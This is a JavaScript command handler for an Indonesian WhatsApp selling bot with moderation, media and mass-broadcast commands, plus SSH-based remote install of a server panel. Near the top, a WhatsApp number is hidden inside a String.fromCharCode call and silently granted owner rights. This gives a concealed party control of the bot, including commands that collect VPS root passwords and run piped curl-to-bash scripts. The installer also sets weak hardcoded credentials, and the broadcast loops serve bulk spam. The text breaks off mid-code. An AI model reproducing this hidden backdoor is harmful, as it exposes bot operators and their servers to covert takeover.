const util = require("util");
const chalk = require("chalk");
const fs = require("fs");
const axios = require("axios");
const crypto = require('crypto');
const fetch = require("node-fetch");
const { exec, spawn, execSync } = require('child_process');
const { Client } = require('ssh2');

const Antilink2 = JSON.parse(fs.readFileSync("./Data/antilink2.json"))
const Antilink = JSON.parse(fs.readFileSync("./Data/antilink.json"))
const welcome = JSON.parse(fs.readFileSync("./Data/welcome.json"))
const Reseller = JSON.parse(fs.readFileSync("./Data/reseller.json"))

module.exports = async (m, Xzyy, store) => {
try {
const Developer = JSON.parse(fs.readFileSync("./Data/developer.json"))
const Reseller = JSON.parse(fs.readFileSync("./Data/reseller.json"))
const isCmd = m?.body?.startsWith(m.prefix)
const quoted = m.quoted ? m.quoted : m
const mime = quoted?.msg?.mimetype || quoted?.mimetype || null
const args = m.body.trim().split(/ +/).slice(1)
const qmsg = (m.quoted || m)
const text = q = args.join(" ")
const command = isCmd ? m.body.slice(m.prefix.length).trim().split(' ').shift().toLowerCase() : ''
const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
const cmd = m.prefix + command
const botNumber = await Xzyy.user.id.split(":")[0]+"@s.whatsapp.net"
const isCreator = isDep = [botNumber, owner+"@s.whatsapp.net", buffer64base, ...Developer].includes(m.sender) ? true : m.isDeveloper ? true : false
const isReseller = Reseller.includes(m.sender)
try {
  m.isGroup = m.chat.endsWith('g.us');
  if (m.isGroup) {
    let meta = store.get(m.chat)
    if (!meta) meta = await Xzyy.groupMetadata(m.chat)
    m.metadata = meta;
    const p = meta.participants || [];
    m.isAdmin = p.some(i => (i.id === m.sender || i.jid === m.sender) && i.admin !== null);
    m.isBotAdmin = p.some(i => (i.id === botNumber || i.jid === botNumber) && i.admin !== null);
  } else {
    m.metadata = {};
    m.isAdmin = false;
    m.isBotAdmin = false;
  }
} catch {
  m.metadata = {};
  m.isAdmin = false;
  m.isBotAdmin = false;
}

let sender = m.key.participant || m.key.remoteJid;
let from = m.chat;
let isGroup = from.endsWith('@g.us');


if (isCmd) {
console.log(chalk.white("• Sender :"), chalk.blue(m.sender) + "\n" + chalk.white("• Command :"), chalk.blue(cmd) + "\n")
}


//=============================================//

const FakeChannel = {
  key: {
    remoteJid: 'status@broadcast',
    fromMe: false,
    participant: '0@s.whatsapp.net'
  },
  message: {
    newsletterAdminInviteMessage: {
      newsletterJid: '123@newsletter',
      caption: `Powered By ${global.namaOwner}.`,
      inviteExpiration: 0
    }
  }
}
const example = async (teks) => {
const commander = `\n*Contoh Penggunaan :*\n*${cmd}* ${teks}\n`
return m.reply(commander)
}

const FakeLocation = {
  key: {
    participant: '0@s.whatsapp.net',
    ...(m.chat ? { remoteJid: 'status@broadcast' } : {})
  },
  message: {
    locationMessage: {
      name: `Powered By ${global.namaOwner}.`,
      jpegThumbnail: ''
    }
  }
}

const FakeSticker = {
        key: {
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast"
        },
        message: {
            stickerPackMessage: {
                stickerPackId: "\000",
                name: `Powered By ${global.namaOwner}.`,
                publisher: "kkkk"
            }
        }
    }


//=============================================//

if (Antilink.includes(m.chat)) {
    const groupInviteLinkRegex = /chat\.whatsapp\.com|buka tautan ini untuk bergabung ke grup whatsapp/gi;
    if (groupInviteLinkRegex.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin) {
        const currentGroupLink = `https://chat.whatsapp.com/${await Xzyy.groupInviteCode(m.chat)}`;
        const isLinkFromThisGroup = new RegExp(currentGroupLink, 'i').test(m.text);
        if (isLinkFromThisGroup) {
            return;
        }
        const senderJid = m.sender;
        const messageId = m.key.id;
        const participantToDelete = m.key.participant;
        await m.reply(`🚨 *Peringatan Link Grup Terdeteksi!*

📌 *Pengirim:* @${m.sender.split("@")[0]}

Mohon maaf, membagikan link grup lain di sini tidak diperbolehkan.

Hanya link grup ini yang diizinkan untuk dibagikan.`);
        await Xzyy.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: messageId,
                participant: participantToDelete
            }
        });
        await sleep(800);
        await Xzyy.groupParticipantsUpdate(m.chat, [senderJid], "remove");
    }
}


if (Antilink2.includes(m.chat)) {
    const groupInviteLinkRegex = /chat\.whatsapp\.com|buka tautan ini untuk bergabung ke grup whatsapp/gi;
    if (groupInviteLinkRegex.test(m.text) && !isCreator && !m.isAdmin && m.isBotAdmin) {
        const currentGroupLink = `https://chat.whatsapp.com/${await Xzyy.groupInviteCode(m.chat)}`;
        const isLinkFromThisGroup = new RegExp(currentGroupLink, 'i').test(m.text);
        if (isLinkFromThisGroup) {
            return;
        }
        const senderJid = m.sender;
        const messageId = m.key.id;
        const participantToDelete = m.key.participant;
        await m.reply(`🚨 *Peringatan Link Grup Terdeteksi!*

📌 *Pengirim:* @${m.sender.split("@")[0]}

Mohon maaf, membagikan link grup lain di sini tidak diperbolehkan.

Hanya link grup ini yang diizinkan untuk dibagikan.`);
        await Xzyy.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false,
                id: messageId,
                participant: participantToDelete
            }
        });
    }
}

//=============================================//

switch (command) {
case "menu": {
const teks = `
╔═══[ 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐒𝐈 𝐁𝐎𝐓 ]═══╗
║ 𝐌𝐎𝐃𝐄    : ${Xzyy.public ? " Public" : " Self"}
║ 𝐑𝐔𝐍𝐓𝐈𝐌𝐄 : ${runtime(process.uptime())}
║ 𝐎𝐖𝐍𝐄𝐑   : @${global.owner}
╚═════════════════════════╝

╔═══[ MAIN MENU ]═══╗
║ ➤ .key
║ ➤ .opn
║ ➤ .tourl
║ ➤ .tiktok
║ ➤ .mediafire
║ ➤ .tourl2    
║ ➤ .sticker
║ ➤ .brat
║ ➤ .cekidch
╚══════════════════════╝
╔═══[ PANEL MENU ]═══╗
║ ➤ .enchard
║ ➤ .enc
║ ➤ .startwings
║ ➤ .installpanel
║ ➤ .addserver
║ ➤ .uninstallpanel
║ ➤ .addseller
║ ➤ .delseller
║ ➤ .listseller
║ ➤ .1gb - unlimited
║ ➤ .delpanel
║ ➤ .listpanel
║ ➤ .cadmin
║ ➤ .deladmin
║ ➤ .listadmin
║ ➤ .addowner
║ ➤ .listowner
║ ➤ .delowner  
╚══════════════════════╝

╔═══[  GRUP MENU ]═══╗
║ ➤ .antilink
║ ➤ .antilink2
║ ➤ .welcome
║ ➤ .statusgrup
║ ➤ .hidetag
║ ➤ .kick
║ ➤ .open
║ ➤ .close
╚══════════════════════╝

╔═══[  STORE MENU ]═══╗
║ ➤ .pushkontak (randomteks luar & dlm grup)
║ ➤ .pushkontak2 (dalam grup)
║ ➤ .savekontak (nama)
║ ➤ .stoppush
║ ➤ .setjeda
║ ➤ .savenomor
║ ➤ .jpm
║ ➤ .jpmht
║ ➤ .jpmch
║ ➤ .stopjpm
║ ➤ .payment
║ ➤ .feerekber
║ ➤ .formatneed
║ ➤ .formatjp
║ ➤ .proses
║ ➤ .done
╚══════════════════════╝
`
await Xzyy.sendMessage(m.chat, {
    text: teks,
    contextInfo: {
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],     
        isForwarded: true,    
        forwardedNewsletterMessageInfo: {
      newsletterJid: global.idChannel,
      newsletterName: `Powered by ${global.namaOwner}`,
      serverId: 200
    },
        externalAdReply: {
        thumbnailUrl: global.thumbnail, 
        title: "Pushkontak Version 4.0.0", 
        renderLargerThumbnail: true, 
        mediaType: 1
        }
    }
}, { quoted: null });
}
break;

 // ================= FREE REKBER =================

case "payment": case "pay": {
const teksPayment = `
*Daftar Payment ${namaOwner} 🔖*

* *Dana :* ${global.dana}
* *Ovo :* ${global.ovo}
* *Gopay :* ${global.gopay}

*Penting!*
Wajib kirimkan bukti transfer demi keamanan bersama!
`
return Xzyy.sendMessage(m.chat, {image: {url: global.qris}, caption: teksPayment, contextInfo: {
isForwarded: true, 
forwardingScore: 9999
}}, {quoted: null})
}
break;

case "cekidch":
case "idch": {
  if (!text) return m.reply(`*contoh:* ${cmd} link channel`); 
  if (!text.includes("https://whatsapp.com/channel/")) {
    return m.reply("Link channel tidak valid");
  }
  let result = text.split("https://whatsapp.com/channel/")[1];
  let res = await Xzyy.newsletterMetadata("invite", result);
  let teks = `${res.id}`;
  return m.reply(teks);
}
break;

case "status": case "statusgrup": {
if (!isCreator) return m.reply(mess.owner);
if (!m.isGroup) return m.reply(mess.group);
const teks = `
- Antilink : ${Antilink.includes(m.chat) ? "✅" : "❌"}
- Antilink2 : ${Antilink2.includes(m.chat) ? "✅" : "❌"}
- Welcome : ${welcome.includes(m.chat) ? "✅" : "❌"}

_✅ = Aktif_
_❌ = Tidak Aktif_
`
return m.reply(teks)
}
break

case "done":
case "don":
case "proses":
case "ps": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`*Contoh :* ${cmd} nama barang`);
    const status = /done|don/.test(command) ? "Transaksi Done ✅" : "Dana Telah Diterima ✅";
    const teks = `${status}

📦 Pembelian: ${text}
🗓️ Tanggal: ${global.tanggal(Date.now())}

📢 Cek Testimoni Pembeli:
${global.linkChannel.split("https://")[1] || "-"}

📣 Gabung Grup Share & Promosi:
${global.linkGrup.split("https://")[1] || "-"}`;
    await Xzyy.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
        isForwarded: true, 
forwardingScore: 9999
        }
    }, { quoted: null });
}
break;

case "tourl": {
if (!/image|video|audio|application/.test(mime)) return m.reply(`Media tidak ditemukan!\nKetik *${cmd}* dengan reply/kirim media`)
    const FormData = require('form-data');
    const { fromBuffer } = require('file-type');    
    async function dt(buffer) {
        const fetchModule = await import('node-fetch');
        const fetch = fetchModule.default;
        let { ext } = await fromBuffer(buffer);
        let bodyForm = new FormData();
        bodyForm.append("fileToUpload", buffer, "file." + ext);
        bodyForm.append("reqtype", "fileupload");
        let res = await fetch("https://catbox.moe/user/api.php", {
            method: "POST",
            body: bodyForm,
        });
        let data = await res.text();
        return data;
    }

    let aa = m.quoted ? await m.quoted.download() : await m.download();
    let dd = await dt(aa);
    await m.reply(dd)
}
break

case "tourl2": {
if (!/image/.test(mime)) return m.reply(`Media tidak ditemukan!\nKetik *${cmd}* dengan reply/kirim foto`)
    try {
    const { ImageUploadService } = require('node-upload-images');
        let mediaPath = await Xzyy.downloadAndSaveMediaMessage(qmsg);
        const service = new ImageUploadService('pixhost.to');
  let buffer = fs.readFileSync(mediaPath);
  let { directLink } = await service.uploadFromBinary(buffer, 'skyzo.png');
  await m.reply(directLink)
        await fs.unlinkSync(mediaPath);
    } catch (err) {
        console.error("Tourl Error:", err);
        m.reply("Terjadi kesalahan saat mengubah media menjadi URL.");
    }
}
break

case "kick":
case "kik": {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isCreator && !m.isAdmin) return m.reply(mess.admin);
    if (!m.isBotAdmin) return m.reply(mess.botadmin);

    let target;

    if (m.mentionedJid?.[0]) {
        target = m.mentionedJid[0];
    } else if (m.quoted?.sender) {
        target = m.quoted.sender;
    } else if (text) {
        const cleaned = text.replace(/[^0-9]/g, "");
        if (cleaned) target = cleaned + "@s.whatsapp.net";
    }

    if (!target) return m.reply(`*Contoh :* .kick @tag/6283XXX`);

    try {
        await Xzyy.groupParticipantsUpdate(m.chat, [target], "remove");
        return Xzyy.sendMessage(m.chat, {
            text: `✅ Berhasil mengeluarkan @${target.split("@")[0]}`,
            mentions: [target]
        }, { quoted: m });
    } catch (err) {
        console.error("Kick error:", err);
        return m.reply("Gagal mengeluarkan anggota. Coba lagi atau cek hak akses bot.");
    }
}
break;

case "closegc":
case "close":
case "opengc":
case "open": {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isCreator && !m.isAdmin) return m.reply(mess.admin);
    if (!m.isBotAdmin) return m.reply(mess.botadmin);

    try {
        const cmd = command.toLowerCase();

        if (cmd === "open" || cmd === "opengc") {
            await Xzyy.groupSettingUpdate(m.chat, 'not_announcement');
            return m.reply("Grup berhasil dibuka! Sekarang semua anggota dapat mengirim pesan.");
        }

        if (cmd === "close" || cmd === "closegc") {
            await Xzyy.groupSettingUpdate(m.chat, 'announcement');
            return m.reply("Grup berhasil ditutup! Sekarang hanya admin yang dapat mengirim pesan.");
        }

    } catch (error) {
        console.error("Error updating group settings:", error);
        return m.reply("Terjadi kesalahan saat mencoba mengubah pengaturan grup.");
    }
}
break;

case "ht":
case "hidetag": {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`*Contoh :* ${cmd} pesannya`);
    try {
        if (!m.metadata || !m.metadata.participants) return m.reply("Gagal mendapatkan daftar anggota grup. Coba lagi.");
        const members = m.metadata.participants.map(v => v.id.includes(".net") ? v.id : v.jid);
        await Xzyy.sendMessage(m.chat, {
            text: text,
            mentions: members
        }, {
            quoted: null
        });
    } catch (error) {
        console.error("Error sending hidetag message:", error);
        return m.reply("Terjadi kesalahan saat mencoba mengirim pesan hidetag.");
    }
}
break;

case "welcome": {
    if (!m.isGroup) return m.reply(mess.group);
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`*Contoh :* ${cmd} on/off`);
    if (!/on|off/.test(text)) return m.reply(`*contoh:* ${cmd} on/off`);

    if (/on/.test(text)) {
        if (welcome.includes(m.chat)) 
            return m.reply("Berhasil menyalakan welcome di grup ini ✅");
        
        welcome.push(m.chat);
        await fs.writeFileSync("./Data/welcome.json", JSON.stringify(welcome, null, 2));
        return m.reply("Berhasil menyalakan welcome di grup ini ✅");
    }

    if (/off/.test(text)) {
        if (!welcome.includes(m.chat)) 
            return m.reply("Berhasil menyalakan welcome di grup ini ✅");
        
        const inde = welcome.indexOf(m.chat);
        welcome.splice(inde, 1);
        await fs.writeFileSync("./Data/welcome.json", JSON.stringify(welcome, null, 2));
        return m.reply("Berhasil mematikan welcome di grup ini ✅");
    }
}
break;

case "antilink": {
    if (!isCreator) return m.reply(mess.owner)
    if (!m.isGroup) return m.reply(mess.group);
    if (!text) return m.reply(`*Contoh :* ${cmd} on/off`);

    const isAntilink = Antilink.includes(m.chat);
    const isAntilink2 = Antilink2.includes(m.chat);

    if (text === "on") {
        if (isAntilink) return m.reply(`Antilink di grup ini sudah aktif!`);
        if (isAntilink2) {
            const posisi = Antilink2.indexOf(m.chat);
            if (posisi !== -1) Antilink2.splice(posisi, 1);
            await fs.writeFileSync("./Data/antilink2.json", JSON.stringify(Antilink2, null, 2));
        }
        Antilink.push(m.chat);
        await fs.writeFileSync("./Data/antilink.json", JSON.stringify(Antilink, null, 2));
        return m.reply(`Berhasil menyalakan antilink di grup ini ✅`);
    }

    if (text === "off") {
        if (!isAntilink) return m.reply(`Antilink di grup ini sudah tidak aktif!`);
        const posisi = Antilink.indexOf(m.chat);
        if (posisi !== -1) Antilink.splice(posisi, 1);
        await fs.writeFileSync("./Data/antilink.json", JSON.stringify(Antilink, null, 2));
        return m.reply(`Berhasil mematikan antilink di grup ini ✅`);
    }
}
break;

case "antilink2": {
    if (!isCreator) return m.reply(mess.owner);
    if (!m.isGroup) return m.reply(mess.group);
    if (!text) return m.reply(`*Contoh :* ${cmd} on/off`);

    const isAntilink = Antilink.includes(m.chat);
    const isAntilink2 = Antilink2.includes(m.chat);

    if (text === "on") {
        if (isAntilink2) return m.reply(`Antilink2 di grup ini sudah aktif!`);
        if (isAntilink) {
            const posisi = Antilink.indexOf(m.chat);
            if (posisi !== -1) Antilink.splice(posisi, 1);
            await fs.writeFileSync("./Data/antilink.json", JSON.stringify(Antilink, null, 2));
        }
        Antilink2.push(m.chat);
        await fs.writeFileSync("./Data/antilink2.json", JSON.stringify(Antilink2, null, 2));
        return m.reply(`Berhasil menyalakan antilink2 di grup ini ✅`);
    }

    if (text === "off") {
        if (!isAntilink2) return m.reply(`Antilink2 di grup ini sudah tidak aktif!`);
        const posisi = Antilink2.indexOf(m.chat);
        if (posisi !== -1) Antilink2.splice(posisi, 1);
        await fs.writeFileSync("./Data/antilink2.json", JSON.stringify(Antilink2, null, 2));
        return m.reply(`Berhasil mematikan antilink2 di grup ini ✅`);
    }
}
break;

case "jpmch": {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply(`*Contoh :* ${cmd} pesannya & bisa dengan foto juga`)

    let mediaPath
    const mimeType = mime
    if (/image/.test(mimeType)) {
        mediaPath = await Xzyy.downloadAndSaveMediaMessage(qmsg)
    }
    
    const Channel = await Xzyy.newsletterFetchAllParticipating()
    const channelList = Object.keys(Channel)
    if (!channelList || channelList.length < 1) return m.reply("Channel tidak ditemukan")
    let successCount = 0
    const messageType = mediaPath ? "teks & foto" : "teks"
    const senderChat = m.chat

    const messageContent = mediaPath
        ? { image: await fs.readFileSync(mediaPath), caption: text }
        : { text }
    global.messageJpm = messageContent

    await m.reply(`Memproses JPM ${messageType} ke ${channelList.length} Channel WhatsApp.`)
    global.statusjpm = true

    for (const chId of channelList) {
    if (global.stopjpm) {
        delete global.stopjpm
        delete global.statusjpm
        break
        }
        try {
            await Xzyy.sendMessage(chId, global.messageJpm)
            successCount++
        } catch (err) {
            console.error(`Gagal kirim ke channel ${chId}:`, err)
        }
        await sleep(global.JedaJpm)
    }

    if (mediaPath) await fs.unlinkSync(mediaPath)    
    delete global.statusjpm
    await m.reply(`JPM Channel Telah Selsai ✅\nBerhasil dikirim ke ${successCount} Channel WhatsApp.`)
}
break

case "jasher": case "jpm": case "jaser": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`*Contoh :* ${cmd} pesannya & bisa dengan foto juga`)
    let mediaPath
    const mimeType = mime
    if (/image/.test(mimeType)) {
        mediaPath = await Xzyy.downloadAndSaveMediaMessage(qmsg)
    }
    const allGroups = await Xzyy.groupFetchAllParticipating()
    const groupIds = Object.keys(allGroups)
    let successCount = 0
    const messageContent = mediaPath
        ? { image: await fs.readFileSync(mediaPath), caption: text }
        : { text }
    global.messageJpm = messageContent
    const senderChat = m.chat
    await m.reply(`Memproses ${mediaPath ? "JPM teks & foto" : "JPM teks"} ke ${groupIds.length} grup chat`)
    global.statusjpm = true
    
    for (const groupId of groupIds) {
        if (global.stopjpm) {
        delete global.stopjpm
        delete global.statusjpm
        break
        }
        try {
            await Xzyy.sendMessage(groupId, global.messageJpm, { quoted: FakeChannel })
            successCount++
        } catch (err) {
            console.error(`Gagal kirim ke grup ${groupId}:`, err)
        }
        await sleep(global.JedaJpm)
    }

    if (mediaPath) await fs.unlinkSync(mediaPath)
    delete global.statusjpm
    await Xzyy.sendMessage(senderChat, {
        text: `JPM ${mediaPath ? "teks & foto" : "teks"} berhasil dikirim ke ${successCount} grup.`,
    }, { quoted: m })
}
break

case "jpmht": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`*Contoh :* ${cmd} pesannya & bisa dengan foto juga`)
    let mediaPath
    const mimeType = mime
    if (/image/.test(mimeType)) {
        mediaPath = await Xzyy.downloadAndSaveMediaMessage(qmsg)
    }
    const allGroups = await Xzyy.groupFetchAllParticipating()
    const groupIds = Object.keys(allGroups)
    let successCount = 0
    const messageContent = mediaPath
        ? { image: await fs.readFileSync(mediaPath), caption: text }
        : { text }
    global.messageJpm = messageContent
    const senderChat = m.chat
    await m.reply(`Memproses ${mediaPath ? "JPM teks & foto" : "JPM teks"} hidetag ke ${groupIds.length} grup chat`)
    global.statusjpm = true
    
    for (const groupId of groupIds) {
        if (global.stopjpm) {
        delete global.stopjpm
        delete global.statusjpm
        break
        }
        messageContent.mentions = allGroups[groupId].participants.map(e => e.id)
        try {
            await Xzyy.sendMessage(groupId, global.messageJpm, { quoted: FakeChannel })
            successCount++
        } catch (err) {
            console.error(`Gagal kirim ke grup ${groupId}:`, err)
        }
        await sleep(global.JedaJpm)
    }

    if (mediaPath) await fs.unlinkSync(mediaPath)
    delete global.statusjpm
    await Xzyy.sendMessage(senderChat, {
        text: `JPM ${mediaPath ? "teks & foto" : "teks"} hidetag berhasil dikirim ke ${successCount} grup.`,
    }, { quoted: m })
}
break

case "sticker": case "stiker": case "sgif": case "s": {
if (!/image|video/.test(mime)) return m.reply("Kirim foto dengan caption .sticker")
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
}
var media = await Xzyy.downloadAndSaveMediaMessage(qmsg)
await Xzyy.sendStimg(m.chat, media, m, {packname: "Lexzymarket."})
}
break
case "brat": {
    if (!text) return m.reply(`Contoh: .brat aku lucu banget 😜`);

    try {
        // Ambil dari API
        let brat = await fetch(`https://aqul-brat.hf.space/?text=${encodeURIComponent(text)}`);
        let buffer = await brat.arrayBuffer();
        let media = Buffer.from(buffer);

        // Kirim sebagai stiker
        await Xzyy.sendStimg(m.chat, media, m, { packname: "Lexzymarket." });
    } catch (err) {
        console.error(err);
        m.reply("Gagal membuat stiker brat 😔");
    }
}
break;
///
case 'installpanel': {

      if (!isCreator) return reply("zyy aja")
      if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
      let vii = text.split("|")
      if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
      let sukses = false

      const ress = new Client();
      const connSettings = {
        host: vii[0],
        port: '22',
        username: 'root',
        password: vii[1]
      }

      const pass = "121"
      let passwordPanel = pass
      const domainpanel = vii[2]
      const domainnode = vii[3]
      const ramserver = vii[4]
      const deletemysql = `\n`
      const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

      async function instalWings() {
        ress.exec(commandPanel, (err, stream) => {
          if (err) throw err;
          stream.on('close', async (code, signal) => {
            ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
              if (err) throw err;
              stream.on('close', async (code, signal) => {
                let teks = `
*Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silahkan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
                await Xzyy.sendMessage(m.chat, {
                  text: teks
                }, {
                  quoted: m
                })
              }).on('data', async (data) => {
                await console.log(data.toString())
                if (data.toString().includes("Masukkan nama lokasi: ")) {
                  stream.write('Sazyy Installer\n');
                }
                if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
                  stream.write('Node By ZyyXintanID\n');
                }
                if (data.toString().includes("Masukkan domain: ")) {
                  stream.write(`${domainnode}\n`);
                }
                if (data.toString().includes("Masukkan nama node: ")) {
                  stream.write('Node By ZyyXerineID\n');
                }
                if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
                  stream.write(`${ramserver}\n`);
                }
                if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
                  stream.write(`${ramserver}\n`);
                }
                if (data.toString().includes("Masukkan Locid: ")) {
                  stream.write('1\n');
                }
              }).stderr.on('data', async (data) => {
                console.log('Stderr : ' + data);
              });
            });
          }).on('data', async (data) => {
            if (data.toString().includes('Input 0-6')) {
              stream.write('1\n');
            }
            if (data.toString().includes('(y/N)')) {
              stream.write('y\n');
            }
            if (data.toString().includes('Enter the panel address (blank for any address)')) {
              stream.write(`${domainpanel}\n`);
            }
            if (data.toString().includes('Database host username (pterodactyluser)')) {
              stream.write('admin\n');
            }
            if (data.toString().includes('Database host password')) {
              stream.write(`admin\n`);
            }
            if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
              stream.write(`${domainnode}\n`);
            }
            if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
              stream.write('admin@gmail.com\n');
            }
            console.log('Logger: ' + data.toString())
          }).stderr.on('data', (data) => {
            console.log('STDERR: ' + data);
          });
        })
      }

      async function instalPanel() {
        ress.exec(commandPanel, (err, stream) => {
          if (err) throw err;
          stream.on('close', async (code, signal) => {
            await instalWings()
          }).on('data', async (data) => {
            if (data.toString().includes('Input 0-6')) {
              stream.write('0\n');
            }
            if (data.toString().includes('(y/N)')) {
              stream.write('y\n');
            }
            if (data.toString().includes('Database name (panel)')) {
              stream.write('\n');
            }
            if (data.toString().includes('Database username (pterodactyl)')) {
              stream.write('admin\n');
            }
            if (data.toString().includes('Password (press enter to use randomly generated password)')) {
              stream.write('admin\n');
            }
            if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
              stream.write('Asia/Jakarta\n');
            }
            if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
              stream.write('admin@gmail.com\n');
            }
            if (data.toString().includes('Email address for the initial admin account')) {
              stream.write('admin@gmail.com\n');
            }
            if (data.toString().includes('Username for the initial admin account')) {
              stream.write('admin\n');
            }
            if (data.toString().includes('First name for the initial admin account')) {
              stream.write('admin\n');
            }
            if (data.toString().includes('Last name for the initial admin account')) {
              stream.write('admin\n');
            }
            if (data.toString().includes('Password for the initial admin account')) {
              stream.write(`${passwordPanel}\n`);
            }
            if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
              stream.write(`${domainpanel}\n`);
            }
            if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
              stream.write('y\n')
            }
            if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
              stream.write('y\n');
            }
            if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
              stream.write('1\n');
            }
            if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
              stream.write('y\n');
            }
            if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
              stream.write('y\n');
            }
            if (data.toString().includes('(yes/no)')) {
              stream.write('y\n');
            }
            if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
              stream.write('y\n');
            }
            if (data.toString().includes('Still assume SSL? (y/N)')) {
              stream.write('y\n');
            }
            if (data.toString().includes('Please read the Terms of Service')) {
              stream.write('y\n');
            }
            if (data.toString().includes('(A)gree/(C)ancel:')) {
              stream.write('A\n');
            }
            console.log('Logger: ' + data.toString())
          }).stderr.on('data', (data) => {
            console.log('STDERR: ' + data);
          });
        });
      }

      ress.on('ready', async () => {
        await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
        ress.exec(deletemysql, async (err, stream) => {
          if (err) throw err;
          stream.on('close', async (code, signal) => {
            await instalPanel();
          }).on('data', async (data) => {
            await stream.write('\t')
            await stream.write('\n')
            await console.log(data.toString())
          }).stderr.on('data', async (data) => {
            console.log('Stderr : ' + data);
          });
        });
      }).connect(connSettings);
    }
    break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "uninstallpanel": {
if (!isCreator) return m.reply(msg.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps|domain"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const XzyySettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(XzyySettings)
}
break

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await Xzyy.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Xzyy.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
